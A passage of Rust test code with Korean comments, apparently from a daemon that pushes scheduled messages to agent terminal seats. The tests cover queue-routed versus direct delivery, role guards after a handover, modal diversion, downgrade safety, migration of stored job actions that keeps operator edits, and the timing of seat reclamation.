            "TTL 회수 등록이 배달 시도보다 앞이다 — close_after_secs:0 에서 회수가 배달을 앞지른다"
        );
        assert!(
            body.contains("let delivered = deliver_push(daemon, job, sid, text, None);")
                && body.contains("let how = delivered?;"),
            "배달 결과를 보류한 채 회수를 등록하는 구조가 아니다 — 실패 경로에서 좌석이 누수된다"
        );
    }

    /// ★행동 검체(리뷰 R1 · codex major): `deliver_push` 의 **두 분기를 실제로 실행**해
    /// 큐 적재와 직접 주입을 관측한다. 소스 문자열 검체만으로는 `deliver_push` 를 항상 주입으로
    /// 바꿔도 호출 문자열이 그대로라 초록이었다.
    #[test]
    fn deliver_push_branches_are_observable() {
        let daemon = test_daemon();
        let s = daemon
            .create_surface(None, Some("sleep 30".into()), None, Some("cso".into()), 24, 80)
            .expect("좌석 생성");
        daemon.roles.lock().unwrap().insert("cso".into(), s.id);
        daemon.surfaces.lock().unwrap().insert(s.id, s.clone());
        // ★(리뷰 R2) 목적지 적격성은 **에이전트 등록**을 요구한다(빈 셸은 대상이 아니다).
        *s.agent_meta.lock().unwrap() = Some(("claude".into(), "/usr/local/bin/claude".into()));
        let depth = || s.pending_queue.lock().unwrap().len();

        // ① 직접 주입 분기 — 큐에는 아무것도 남지 않는다(§8 "스케줄 push 는 큐를 우회한다").
        let direct: Job = serde_json::from_value(json!({
            "id": "direct", "action": "push", "to": "cso", "text": "x"
        }))
        .unwrap();
        assert!(!direct.uses_queue());
        assert_eq!(deliver_push(&daemon, &direct, s.id, "[schedule direct] 본문", None), Ok("pushed"));
        assert_eq!(depth(), 0, "직접 주입이 큐에 적재됐다(경로가 뒤바뀌었다)");

        // ② 큐 경유 분기 — 좌석 활성 큐에 남고 **주입은 배달자(게이트 통과 후)가 한다**.
        let queued: Job = serde_json::from_value(json!({
            "id": "cso-alert-inbox-check-60m", "action": ACTION_PUSH_QUEUED, "to": "cso", "text": "x"
        }))
        .unwrap();
        assert!(queued.uses_queue(), "action 만으로도 큐 경유여야 한다(via_queue 필드 없이)");
        assert_eq!(
            deliver_push(&daemon, &queued, s.id, "[schedule cso-alert-inbox-check-60m] 점검", None),
            Ok("queued")
        );
        assert_eq!(depth(), 1, "큐 경유가 적재하지 않았다");
        let e = s.pending_queue.lock().unwrap()[0].clone();
        assert_eq!(e.origin, "schedule", "큐 항목의 경로 태그가 schedule 이 아니다");
        // ★발신 라벨은 **그 잡**이다(종전 "daemon" → 원장에서 스케줄 발화가 데몬 경보로 찍혔다).
        assert_eq!(e.from.as_deref(), Some("schedule:cso-alert-inbox-check-60m"));
        // surface ref 형식이 아니므로 원장에서는 from_label 로 간다(§8 from 계약 준수).
        let (from, label) = crate::delivery::split_queue_from(e.from.as_deref());
        assert_eq!(from, None, "임의 문자열이 원장 from(surface ref)에 들어갔다");
        assert_eq!(label.as_deref(), Some("schedule:cso-alert-inbox-check-60m"));

        // ③' 직접 주입 분기도 **같은 역할 가드**를 받는다(리뷰 R2 · claude minor).
        //     종전에는 큐 경유에만 가드가 있어 기존 builtin push 전원(하트비트 등)이 인계 경쟁을
        //     그대로 졌다 — 인계가 끝난 뒤의 주입은 버려진 셸에 타이핑된다.
        {
            let mut roles = daemon.roles.lock().unwrap();
            roles.insert("cso".into(), s.id + 4_242); // 인계 완료(다른 좌석이 역할을 가져갔다)
        }
        let direct_err = deliver_push(
            &daemon,
            &direct,
            s.id,
            "[schedule direct] 인계 뒤 본문",
            Some(crate::alert_route::RoleGuard::Exact("cso")),
        )
        .expect_err("인계된 뒤에도 구 좌석에 직접 주입했다");
        assert!(direct_err.contains("handed over"), "실패 사유가 인계 경쟁이 아니다: {direct_err}");
        assert_eq!(depth(), 1, "직접 주입 거절이 큐를 건드렸다");
        // 가드가 없으면(좌석을 지목받은 fresh·if_absent:launch 경로) 종전대로 주입된다.
        assert_eq!(
            deliver_push(&daemon, &direct, s.id, "[schedule direct] 지목 본문", None),
            Ok("pushed"),
            "좌석을 지목받은 경로까지 가드가 막았다(무회귀 위반)"
        );
        daemon.roles.lock().unwrap().insert("cso".into(), s.id); // 원복

        // ③ 역할 가드 — 대상을 역할로 골랐다면 인계 뒤 적재는 거절된다.
        daemon.roles.lock().unwrap().insert("cso".into(), s.id + 9_999);
        let err = deliver_push(
            &daemon,
            &queued,
            s.id,
            "[schedule x] y",
            Some(crate::alert_route::RoleGuard::Exact("cso")),
        )
        .expect_err("인계된 뒤에도 버려진 셸에 적재됐다");
        assert!(err.contains("role_changed"), "실패 사유가 인계 경쟁이 아니다: {err}");
        assert_eq!(depth(), 1, "거절인데 항목이 늘었다");
        let _ = crate::governance::close_surface(&daemon, s.id, crate::governance::CloseCause::Reap);
    }

    /// ★(0.14.41 · U8 P1) 스케줄 **직접 push** 도 대상 좌석 화면에 질문·선택 창(모달)이 전경이면 본문을
    /// 쓰지 않고 좌석 큐로 우회한다 — 종전에는 게이트가 전혀 없어 하트비트·wakeup 문안이 오너의 질문 창에
    /// 타이핑됐다(그 CR 이 기본 선택지를 누를 수 있다 · 조사 RC4). 판정 술어는 큐 배달 게이트와 같은
    /// 것이라(`modal_foreground` ∨ 선택기 행) 적재된 항목은 모달이 닫힌 뒤에 배달된다. 모달이 아니면
    /// 종전과 같은 직접 주입이다(`deliver_push_branches_are_observable` 가 그 대조군).
    #[test]
    fn u8_p1_direct_push_diverts_to_the_seat_queue_on_a_foreground_modal() {
        let daemon = test_daemon();
        let s = daemon
            .create_surface(None, Some("sleep 30".into()), None, Some("cso".into()), 24, 80)
            .expect("좌석 생성");
        daemon.roles.lock().unwrap().insert("cso".into(), s.id);
        daemon.surfaces.lock().unwrap().insert(s.id, s.clone());
        *s.agent_meta.lock().unwrap() = Some(("claude".into(), "/usr/local/bin/claude".into()));
        let screen = cys::first_run_gates::fixtures::LIVE_PERMISSION_PROMPT.replace('\n', "\r\n");
        {
            let mut p = s.parser.lock().unwrap();
            p.process(b"\x1b[2J\x1b[H");
            p.process(screen.as_bytes());
        }
        let direct: Job = serde_json::from_value(json!({
            "id": "direct", "action": "push", "to": "cso", "text": "x"
        }))
        .unwrap();
        assert!(!direct.uses_queue());
        assert_eq!(
            deliver_push(&daemon, &direct, s.id, "[heartbeat] 5분 보고", None),
            Ok("queued(modal)"),
            "권한 창이 전경인데 직접 주입했다(본문·CR 이 선택지를 누른다)"
        );
        let q = s.pending_queue.lock().unwrap().clone();
        assert_eq!(q.len(), 1, "모달 우회가 좌석 큐에 적재하지 않았다");
        assert_eq!(q[0].origin, "schedule");
        assert_eq!(q[0].from.as_deref(), Some("schedule:direct"));
        let _ = crate::governance::close_surface(&daemon, s.id, crate::governance::CloseCause::Reap);
    }

    /// ★강등 실행 검체(리뷰 R1 · codex blocking): 구 데몬의 `fire()` 는 action 을
    /// `push`·`command` 로만 분기하고 나머지는 `unknown action` 에러다. 이 잡의 action 이
    /// 그 집합에 들어가는 순간 **롤백한 데몬이 게이트 없이 주입한다**.
    #[test]
    fn a_downgraded_daemon_rejects_the_queue_job_instead_of_injecting() {
        // 구 데몬의 분기를 그대로 재현한 순수 함수(그쪽 코드는 여기서 실행할 수 없다).
        fn legacy_dispatch(action: &str) -> Result<&'static str, String> {
            match action {
                "push" => Ok("fire_push"),
                "command" => Ok("fire_command"),
                other => Err(format!("unknown action '{other}'")),
            }
        }
        let mut jobs: Vec<serde_json::Value> = Vec::new();
        apply_builtin_jobs(&mut jobs);
        let j = jobs
            .iter()
            .find(|j| j["id"].as_str() == Some("cso-alert-inbox-check-60m"))
            .expect("점검 잡 부재");
        let action = j["action"].as_str().unwrap();
        assert!(
            legacy_dispatch(action).is_err(),
            "구 데몬이 이 잡을 실행한다 — 강등이 곧 게이트 우회다"
        );
        // 신 데몬은 두 표현 모두 큐 경유로 읽는다.
        for a in [ACTION_PUSH_QUEUED, "push"] {
            let job: Job = serde_json::from_value(json!({
                "id": "x", "action": a, "to": "cso", "text": "t",
                "via_queue": a == "push"
            }))
            .unwrap();
            assert!(job.uses_queue(), "{a} 가 큐 경유로 읽히지 않았다");
        }
        // 다른 builtin(직접 주입이 계약인 잡)은 여전히 구 데몬이 아는 action 이다 — 무회귀.
        for other in jobs.iter().filter(|x| x["id"].as_str() != Some("cso-alert-inbox-check-60m")) {
            let a = other["action"].as_str().unwrap();
            assert!(LEGACY_ACTIONS.contains(&a), "{} 의 action 이 바뀌었다: {a}", other["id"]);
        }
    }

    /// ★표적 마이그레이션(리뷰 R1 · codex blocking): 구 빌드가 심어 둔 **동버전** 잡은
    /// `apply_builtin_jobs` 가 무접촉으로 지나간다 — 그러면 저장된 `action:"push"` 가 남아
    /// 큐 우회 주입이 계속된다. 전역 버전 범프는 §B-5 금지(다른 builtin 의 운영자 편집 소실)이므로
    /// **같은 id·같은 마커 항목의 그 필드만** 고친다.
    #[test]
    fn stored_legacy_push_action_is_migrated_in_place_without_a_version_bump() {
        let mut jobs: Vec<serde_json::Value> = vec![json!({
            "id": "cso-alert-inbox-check-60m",
            "every_minutes": 120,                       // 운영자가 손으로 고친 주기
            "action": "push",                            // 구 빌드가 심은 값
            "to": "cso",
            "if_absent": "skip",
            "via_queue": true,
            "text": "운영자가 고친 문안",
            "_builtin": "alert",
            "_builtin_version": BUILTIN_JOBS_VERSION
        })];
        let (changed, conflicts, _) = apply_builtin_jobs(&mut jobs);
        assert!(changed, "저장된 구 action 이 그대로 남았다(강등 시 게이트 우회)");
        assert!(conflicts.is_empty());
        let j = &jobs[0];
        assert_eq!(j["action"].as_str(), Some(ACTION_PUSH_QUEUED));
        assert_eq!(j["via_queue"].as_bool(), Some(true));
        // ★운영자 편집은 **그대로** 남는다(통째 교체가 아니라 그 필드만 고쳤다는 증거).
        assert_eq!(j["every_minutes"].as_u64(), Some(120), "운영자 주기 편집이 소실됐다");
        assert_eq!(j["text"].as_str(), Some("운영자가 고친 문안"), "운영자 문안이 소실됐다");
        assert_eq!(BUILTIN_JOBS_VERSION, 2, "표적 이관에 전역 버전을 올렸다(§B-5 위반)");
        // 재실행 무접촉(멱등).
        let (c2, _, _) = apply_builtin_jobs(&mut jobs);
        assert!(!c2, "이관 뒤 재실행이 또 바꾼다(비멱등)");
        // 사용자가 그 id 를 선점한 경우(마커 불일치)는 손대지 않는다 — 종전 계약 불변.
        let mut theirs: Vec<serde_json::Value> = vec![json!({
            "id": "cso-alert-inbox-check-60m", "action": "push", "to": "master"
        })];
        let (c3, conf3, _) = apply_builtin_jobs(&mut theirs);
        assert!(!c3 || theirs[0]["action"].as_str() == Some("push"));
        assert_eq!(theirs[0]["action"].as_str(), Some("push"), "사용자 잡의 action 을 바꿨다");
        assert!(conf3.contains(&"cso-alert-inbox-check-60m".to_string()), "선점 conflict 미보고");
    }
}

// ═════════════════ 독립 판정(triage R3-WP3B) — 잔여 지적 재현 검체 ═════════════════
// 현재 HEAD 에서 **실패하도록** 쓰였다. 통과하면 그 지적은 반증이다.
#[cfg(test)]
mod triage_schedule {
    use super::*;
    use serde_json::json;
    use std::sync::atomic::Ordering;
    use super::tests::test_daemon;

    /// [codex #8 blocking] 강등 안전이 builtin 만 덮고, **지원한다고 문서화한 opt-in 표현**은 덮지 않는다.
    ///
    /// `Job::uses_queue`(schedule.rs:113)는 `action:"push" + via_queue:true` 도 큐 경유로 인정한다.
    /// 그 표현으로 저장된 잡을 구 데몬(=`via_queue` 미지 필드 무시)이 읽으면 `"push"` 로 보고
    /// `fire_push` → 직접 `inject` 를 한다 — 큐가 지키던 초안·승인대기·alt-screen 게이트가
    /// 통째로 사라진다.
    #[test]
    fn triage_x8_queue_required_job_is_stored_in_a_downgrade_rejected_action() {
        let job: Job = serde_json::from_value(json!({
            "id": "operator-opt-in", "action": "push", "to": "cso",
            "text": "x", "every_minutes": 60, "via_queue": true
        }))
        .expect("추가-전용 스키마");
        assert!(job.uses_queue(), "전제: 신 데몬은 이 표현을 큐 경유로 읽는다");
        assert_eq!(
            job.action, ACTION_PUSH_QUEUED,
            "큐 경유가 계약인 잡이 구 데몬이 **수용**하는 action 으로 저장돼 있다(강등 시 직접 주입)"
        );
    }

    /// [codex #9 blocking] fresh 좌석 회수가 큐에 적재된 일감을 파괴한다.
    ///
    /// `fire_push`(schedule.rs:1043-1050)는 `deliver_push` 가 `"queued"`(=적재 성공, 배달 아님)
    /// 를 돌려줘도 `effective_close_ttl` 로 회수 타이머를 **무조건** 건다. `close_after_secs:0`
    /// 은 `Some(0)` 이라(:897-900) 배달 게이트가 열리기 전에 `close_surface` 가 돌고,
    /// 그 경로는 활성 큐를 폐기한다(governance.rs:4277 `drain_active_except_inflight`).
    #[test]
    fn triage_x9_queued_fresh_job_does_not_arm_an_immediate_reclamation() {
        let job: Job = serde_json::from_value(json!({
            "id": "fresh-queued", "action": ACTION_PUSH_QUEUED, "to": "w", "text": "x",
            "at": 1_700_000_000i64, "fresh": true, "close_after_secs": 0,
            "launch": {"role": "w", "agent": "claude"}
        }))
        .expect("스키마");
        assert!(job.uses_queue() && job.fresh, "전제: 큐 경유 + fresh");
        assert_ne!(
            effective_close_ttl(&job),
            Some(0),
            "큐 경유 배달은 준비 게이트를 기다리는데 회수는 즉시다 — 적재된 일감이 배달 전에 폐기된다"
        );
    }

    /// ★(성찰 A4 · blocking) **보류 중인 fresh 작업을 좌석과 함께 회수하지 않는다.**
    ///
    /// 실행 반례(종전): `push_queued + fresh:true + close_after_secs:0`(→ 하한 60초) 적재 후
    /// 승인 대기 1,800초가 지나면 활성 큐에 항목이 남아도 `close_surface(…, Reap)` 이 조건 없이
    /// 돌아 그 항목이 `queue.dropped` 로 폐기됐다 — 잡의 일감은 끝내 실행되지 않는데 그 사실은
    /// 이미 `schedule.fired{detail:"queued"}`(성공)로 보고된 뒤다.
    ///
    /// 전체 경로(60초 TTL + 1,800초 유예 = **1,860초**)를 1000배 압축 시계로 그대로 돈다
    /// ([`ReapTiming::compressed`] — 경계 건수·순서는 프로덕션과 동일하다). 상수 자체의 값과
    /// **분리**는 `fresh_reap_constants_separate_leak_period_from_delivery_grace` 가 핀한다.
    #[tokio::test]
    async fn triage_a4_a_pending_queue_item_defers_the_fresh_seat_reap() {
        let daemon = test_daemon();
        let s = daemon
            .create_surface(None, Some("sleep 30".into()), None, Some("w-fresh-1".into()), 24, 80)
            .expect("좌석 생성");
        daemon.roles.lock().unwrap().insert("w-fresh-1".into(), s.id);
        daemon.surfaces.lock().unwrap().insert(s.id, s.clone());
        *s.agent_meta.lock().unwrap() = Some(("claude".into(), "/usr/local/bin/claude".into()));
        // 적재(승인 대기) — 배달자가 게이트를 통과시키기 전까지 이 항목은 활성 큐에 남는다.
        let job: Job = serde_json::from_value(json!({
            "id": "fresh-queued", "action": ACTION_PUSH_QUEUED, "to": "w", "text": "x",
            "fresh": true, "close_after_secs": 0, "launch": {"role": "w", "agent": "claude"}
        }))
        .expect("스키마");
        assert_eq!(effective_close_ttl(&job), Some(QUEUED_CLOSE_MIN_TTL_SECS), "전제: 하한 60초");
        assert_eq!(
            deliver_push(&daemon, &job, s.id, "[schedule fresh-queued] 본문", None),
            Ok("queued")
        );
        let depth = || s.pending_queue.lock().unwrap().len();
        assert_eq!(depth(), 1, "전제 불성립 — 적재되지 않았다");

        let mut rx = daemon.bus.subscribe();
        let d = Arc::clone(&daemon);
        let sid = s.id;
        let handle = tokio::spawn(async move {
            reap_fresh_seat(d, sid, "fresh-queued".into(), ReapTiming::compressed(QUEUED_CLOSE_MIN_TTL_SECS), true).await;
        });

        // 유예 경계(60 + 1,800)에서 **전용 안내 이벤트 1건**이 나온다.
        let notice = tokio::time::timeout(Duration::from_secs(30), async {
            loop {
                let e = rx.recv().await.expect("버스");
                if e["name"] == "schedule.fresh_reap_deferred" {
                    return e;
                }
                assert_ne!(e["name"], "queue.dropped", "보류 중인 일감이 폐기됐다");
            }
        })
        .await
        .expect("유예 경계에서 안내 이벤트가 오지 않았다(조용히 회수했거나 영영 기다린다)");
        assert_eq!(notice["payload"]["job"], json!("fresh-queued"));
        assert_eq!(notice["payload"]["waited_ms"], json!(QUEUED_DELIVERY_GRACE_SECS),
            "안내가 유예 경계가 아닌 곳에서 났다");
        assert_eq!(notice["payload"]["grace_secs"], json!(QUEUED_DELIVERY_GRACE_SECS));
        // ★그 순간의 사실(이 스레드는 await 하지 않았으므로 회수 태스크는 진행하지 않는다):
        //   좌석 보존 · 항목 보존 · 주입 0.
        assert!(daemon.get_surface(sid).is_some(), "미완료 항목이 있는데 좌석을 닫았다");
        assert_eq!(depth(), 1, "미완료 항목이 큐에서 사라졌다(주입 또는 폐기)");

        // 처분이 정해지면(배달·만료) 그때 회수된다 — 무한 보류가 아니다.
        s.pending_queue.lock().unwrap().clear();
        tokio::time::timeout(Duration::from_secs(30), handle)
            .await
            .expect("처분이 정해졌는데 회수가 끝나지 않았다")
            .expect("회수 태스크 패닉");
        assert!(
            daemon.get_surface(sid).is_none_or(|x| x.exited.load(Ordering::Relaxed)),
            "처분이 정해졌는데 좌석이 회수되지 않았다(누수)"
        );
    }

    /// ★(성찰 A4) '누수 방지 주기' 와 '배달 유예' 는 **다른 상수**다 — 한 숫자로 묶여 있어서
    /// 반복 fresh 잡의 기본 TTL 을 바꾸면 배달 유예가 함께 움직였다.
    #[test]
    fn fresh_reap_constants_separate_leak_period_from_delivery_grace() {
        assert_eq!(FRESH_RECURRING_DEFAULT_TTL_SECS, 1800, "누수 방지 주기");
        assert_eq!(QUEUED_DELIVERY_GRACE_SECS, 1800, "배달 유예 안내 경계");
        assert_eq!(QUEUED_CLOSE_MIN_TTL_SECS, 60, "큐 경유 회수 하한");
        // 실행 반례의 전체 경로: 60초 TTL + 1,800초 유예 = 1,860초.
        assert_eq!(QUEUED_CLOSE_MIN_TTL_SECS + QUEUED_DELIVERY_GRACE_SECS, 1_860);
        let src = include_str!("schedule.rs");
        // ★needle 을 쪼개 조립한다 — `include_str!` 은 **이 검체 자신**도 읽으므로 통짜
        //   리터럴을 쓰면 검체가 자기 문자열에 걸려 언제나 실패한다(자기참조 함정).
        let fused = format!("{}{}", "QUEUED_CLOSE_MAX_WAIT_SECS: u64 = ", "FRESH_RECURRING_DEFAULT_TTL_SECS");
        assert!(!src.contains(&fused), "두 성질이 다시 한 상수로 묶였다");
        // 회수는 **조건부**다: 미완료 항목이 있으면 닫지 않는다.
        let body = src
            .split("async fn reap_fresh_seat(")
            .nth(1)
            .expect("회수 함수 소실");
        let body = &body[..body.find("\n}\n").expect("함수 끝")];
        assert!(
            body.contains("while d.get_surface(sid).is_some() && surface_queue_pending(&d, sid)"),
            "회수 대기가 '좌석 소멸'과 '처분 확정'을 다시 한 술어로 접었다"
        );
        assert!(
            !body.contains("waited < QUEUED"),
            "시간 상한이 다시 회수 조건이 됐다(미완료 항목이 좌석과 함께 폐기된다)"
        );
    }

    /// [codex #13 major] 표적 마이그레이션이 운영자의 **임의** action 편집을 덮어쓴다.
    ///
    /// 조건이 "구 표현(`push`)인가" 가 아니라 "코드 정의와 다른가" 다(schedule.rs:341-342).
    /// 같은 id·같은 마커를 유지한 채 action 을 `command` 로 바꾼 운영자 잡은 다음 부트에서
    /// `push_queued` 로 바뀌어 설정한 명령이 돌지 않고 그 문자열이 inbox 잡이 된다.
    #[test]
    fn triage_x13_migration_preserves_an_operator_non_push_action() {
        let mut jobs = vec![json!({
            "id": "cso-alert-inbox-check-60m",
            "every_minutes": 60,
            "action": "command",
            "command": "cys status --json > /tmp/cso-inbox.json",
            "_builtin": "alert",
            "_builtin_version": BUILTIN_JOBS_VERSION
        })];
        let (_changed, _conflicts, _) = apply_builtin_jobs(&mut jobs);
        assert_eq!(
            jobs[0]["action"].as_str(),
            Some("command"),
            "운영자가 바꾼 action 이 무언 소실됐다(§B-5 수기 편집 보존 위반)"
        );
    }
}

// ═════════════════ 수렴(R3-WP3B) — 고침이 세운 불변식의 회귀 핀 ═════════════════
#[cfg(test)]
mod converge_schedule {
    use super::*;
    use serde_json::json;

    /// ★X8: 저장된 표현도 정규형으로 접힌다 — **그리고 `push` 이외의 action 은 건드리지 않는다**
    /// (그것을 건드리는 것이 X13 과 같은 부류의 운영자 편집 소실이다).
    #[test]
    fn converge_stored_queue_action_is_canonicalized_but_only_from_push() {
        let mut jobs = vec![
            json!({"id": "a", "action": "push", "to": "cso", "text": "x", "via_queue": true}),
            json!({"id": "b", "action": "command", "command": "true", "via_queue": true}),
            json!({"id": "c", "action": "push", "to": "master", "text": "x"}),
        ];
        assert!(canonicalize_stored_queue_actions(&mut jobs), "구 표현이 그대로 남았다");
        assert_eq!(jobs[0]["action"].as_str(), Some(ACTION_PUSH_QUEUED));
        assert_eq!(jobs[1]["action"].as_str(), Some("command"), "다른 action 을 큐 표현으로 덮었다");
        assert_eq!(jobs[2]["action"].as_str(), Some("push"), "큐 경유가 아닌 잡을 바꿨다");
        // 멱등.
        assert!(!canonicalize_stored_queue_actions(&mut jobs), "재실행이 또 바꾼다(비멱등)");
    }

    /// ★X9: 큐 경유 잡의 회수 하한 — 직접 주입 잡의 `0` 은 **그대로**다(무회귀).
    #[test]
    fn converge_close_ttl_floor_applies_only_to_queue_backed_jobs() {
        let mk = |v: serde_json::Value| -> Job { serde_json::from_value(v).expect("스키마") };
        let direct = mk(json!({"id": "d", "action": "push", "to": "w", "text": "x",
                               "at": 1_700_000_000i64, "fresh": true, "close_after_secs": 0}));
        assert_eq!(effective_close_ttl(&direct), Some(0), "직접 주입 잡의 운영자 0 이 바뀌었다");
        let queued = mk(json!({"id": "q", "action": ACTION_PUSH_QUEUED, "to": "w", "text": "x",
                               "at": 1_700_000_000i64, "fresh": true, "close_after_secs": 0}));
        assert_eq!(effective_close_ttl(&queued), Some(QUEUED_CLOSE_MIN_TTL_SECS));
        // 하한보다 큰 명시값은 존중한다(하한은 바닥이지 덮개가 아니다).
        let long = mk(json!({"id": "l", "action": ACTION_PUSH_QUEUED, "to": "w", "text": "x",
                             "at": 1_700_000_000i64, "fresh": true, "close_after_secs": 9_000}));
        assert_eq!(effective_close_ttl(&long), Some(9_000));
    }

    /// ★X13: 운영자가 바꾼 action 은 덮지 않고 **conflict 로 보고**한다(무음 소실 금지).
    #[test]
    fn converge_edited_builtin_action_is_reported_not_overwritten() {
        let mut jobs = vec![json!({
            "id": "cso-alert-inbox-check-60m", "every_minutes": 60, "action": "command",
            "command": "true", "_builtin": "alert", "_builtin_version": BUILTIN_JOBS_VERSION
        })];
        let (_changed, preempted, edited) = apply_builtin_jobs(&mut jobs);
        assert_eq!(jobs[0]["action"].as_str(), Some("command"), "운영자 편집이 덮였다");
        assert_eq!(
            edited,
            vec![("cso-alert-inbox-check-60m".to_string(), "command".to_string())],
            "덮지 않은 사실을 알리지 않았다(조용한 무접촉은 관측 소실이다)"
        );
        // ★(수렴 R2 · X13) 그 사실이 **예약 id 선점**으로 보고되면 운영자는 틀린 처방을 읽는다.
        assert!(
            preempted.is_empty(),
            "id 선점은 일어나지 않았는데 선점 목록에 넣었다(다른 id 로 옮기라는 틀린 안내가 나간다)"
        );
    }

    /// ★X8 잔여(major): **핫리로드도 파일을 접는다** — 메모리만 접으면 디스크는 강등 취약형이다.
    ///
    /// 신 데몬이 도는 동안 운영자가 손으로 `action:"push" + via_queue:true` 를 넣으면, 종전에는
    /// `load_jobs` 의 serde 계층이 **메모리의 Job 만** 정규화했다. 파일은 그대로 남아 강등된 구
    /// 데몬이 그것을 `push` 로 읽고 큐 준비 게이트를 우회해 직접 주입한다.
    #[test]
    fn converge_x8_hot_reload_folds_the_stored_representation_too() {
        let dir = std::env::temp_dir().join(format!(
            "cys-converge-x8-{}-{}",
            std::process::id(),
            now_epoch() as u64
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("schedule.json");
        let raw = json!({"jobs": [
            {"id": "q", "action": "push", "via_queue": true, "to": "cso", "text": "x",
             "every_minutes": 60},
            {"id": "c", "action": "command", "command": "true", "every_minutes": 5}
        ]});
        std::fs::write(&path, raw.to_string()).unwrap();
        let mut root: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        assert!(canonicalize_schedule_file(&path, &mut root), "구 표현을 접지 않았다");
        let on_disk: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        assert_eq!(
            on_disk["jobs"][0]["action"].as_str(),
            Some(ACTION_PUSH_QUEUED),
            "파일이 여전히 구 표현이다 — 강등된 구 데몬이 직접 주입한다"
        );
        assert_eq!(on_disk["jobs"][0]["via_queue"].as_bool(), Some(true), "뜻이 바뀌었다");
        assert_eq!(on_disk["jobs"][1]["action"].as_str(), Some("command"), "다른 action 을 만졌다");
        // 멱등 — 바꿀 것이 없으면 파일을 건드리지 않는다(매 틱 쓰기 금지).
        let mut again: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        assert!(!canonicalize_schedule_file(&path, &mut again), "재실행이 또 쓴다(비멱등)");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// ★X8 잔여: 원샷 잡 제거가 **강등 취약형을 다시 영속하지 않는다**.
    #[test]
    fn converge_x8_one_shot_removal_does_not_repersist_the_unsafe_action() {
        let mut root = json!({"jobs": [
            {"id": "once", "action": "command", "command": "true", "at": 1},
            {"id": "q", "action": "push", "via_queue": true, "to": "cso", "text": "x"}
        ]});
        drop_job_and_canonicalize(&mut root, "once");
        assert_eq!(root["jobs"].as_array().map(|a| a.len()), Some(1), "원샷 잡이 남았다");
        assert_eq!(
            root["jobs"][0]["action"].as_str(),
            Some(ACTION_PUSH_QUEUED),
            "원시 JSON 을 되쓰는 경로가 구 표현을 디스크에 다시 심었다"
        );
    }
}

/// ★(통합 2026-09-10) 병합 뒤 남은 **교차 영역 잔여**(P3·P8)의 검체. 파일 끝에 모아 병합 충돌을
/// 이 블록 하나로 국소화한다.
#[cfg(test)]
mod merge_residue_tests {
    use super::*;

    fn builtin(id: &str) -> serde_json::Value {
        builtin_jobs()
            .into_iter()
            .find(|j| j["id"].as_str() == Some(id))
            .unwrap_or_else(|| panic!("builtin '{id}' 이 없다"))
    }

    /// ★P3 — 편성 심박이 부서의 **확정 cwd** 를 넘긴다.
    ///
    /// 실패 방향: `--cwd` 없이 `javis_formation.py ensure` 를 부르면 좌석이 데몬 cwd 로 재생성되고
    /// (launchd cwd=`/`), 시드한 (acctdir, cwd) 쌍과 어긋나 신뢰 관문이 다시 선다(에러 4 재발).
    /// 반대 방향의 안전: `cys-dept cwd` 는 미등재·등재 cwd 부재에서 stdout 0 + 비0 exit 이라
    /// `${c:+…}` 가 `--cwd` 를 **생략**한다 = 종전 동작(회귀 0 · 거짓 cwd 전파 0).
    #[test]
    fn p3_formation_heartbeat_passes_the_department_cwd() {
        let cmd = builtin("formation-heartbeat")["command"].as_str().unwrap().to_string();
        assert!(
            cmd.contains(r#"c="$("$pk/bin/cys-dept" cwd "$d" 2>/dev/null)" || c="""#),
            "부서 cwd 를 조회하지 않는다: {cmd}"
        );
        assert!(
            cmd.contains(r#"ensure --socket "$s" ${c:+--cwd "$c"}"#),
            "조회한 cwd 를 ensure 에 넘기지 않는다(또는 빈 값에서 --cwd 를 생략하지 않는다): {cmd}"
        );
        // 팩 쪽 두 계약이 실재해야 이 잡이 성립한다(소스 대조 — 팩은 다른 레인 소유다).
        let dept = include_str!("../../../cysjavis-pack/bin/cys-dept");
        assert!(dept.contains("\n  cwd)"), "cys-dept 에 cwd 동사가 없다");
        let form = include_str!("../../../cysjavis-pack/bin/javis_formation.py");
        assert!(form.contains(r#"if a == "--cwd""#), "javis_formation 이 --cwd 를 읽지 않는다");
    }

    /// ★WP6-5 — ensure 실패를 누적하되 뒤 부서도 실행한다 · (성찰 2회) 실패 부서를 stderr 로 지목한다.
    /// 실패 방향: 중간 부서 실패를 마지막 부서 성공으로 가리면 schedule.error가 사라진다 · 부서명이
    /// 없으면 `rc=1` 만 남아 어느 부서를 봐야 하는지 모른다 · 성공 부서가 지목되면 오진이다.
    #[test]
    fn formation_heartbeat_surfaces_a_failing_ensure() {
        let cmd = builtin("formation-heartbeat")["command"].as_str().unwrap().to_string();
        assert!(!cmd.contains(concat!("--json ||", " true")), "ensure 실패를 삼킨다: {cmd}");
        assert!(
            cmd.contains(r#"--json || { rc=1; echo "formation-heartbeat: ensure failed dept=$d" >&2; }"#),
            "부서별 실패를 누적하지 않거나 실패 부서를 stderr 로 지목하지 않는다: {cmd}"
        );
        assert!(cmd.contains("rc=0;") && cmd.trim_end().ends_with("exit $rc"),
                "누적한 rc를 반환하지 않는다: {cmd}");
        let form = include_str!("../../../cysjavis-pack/bin/javis_formation.py");
        assert!(form.contains(r#"return 1 if state_kind(state) == "failed" else 0"#),
                "failed 외의 비0은 평시 심박 소음이다");

        // 실제 POSIX 셸로 중간 실패·후속 성공과 전부 성공을 잰다. 자식은 임시 스텁뿐이다.
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let root = std::env::temp_dir().join(format!(
                "cys-heartbeat-{}-{}", std::process::id(), now_epoch().to_bits()
            ));
            let bin = root.join("bin");
            std::fs::create_dir_all(&bin).unwrap();
            std::fs::write(bin.join("cys-dept"), r#"#!/bin/sh
case "$1" in
    list) printf 'first\nlast\n' ;;
    sock) printf '/tmp/%s.sock\n' "$2" ;;
    cwd) printf '/tmp/department %s\n' "$2" ;;
    *) exit 1 ;;
esac
"#).unwrap();
            std::fs::write(bin.join("python3"), r#"#!/bin/sh
printf '%s\n' "$4" >> "$CYS_PACK_DIR/seen"
if [ "$4" = /tmp/first.sock ] && [ "$FAIL_FIRST" = 1 ]; then
    printf 'ensure failed\n' >&2
    exit 1
fi
exit 0
"#).unwrap();
            std::fs::write(bin.join("javis_formation.py"), "stub\n").unwrap();
            for name in ["cys-dept", "python3"] {
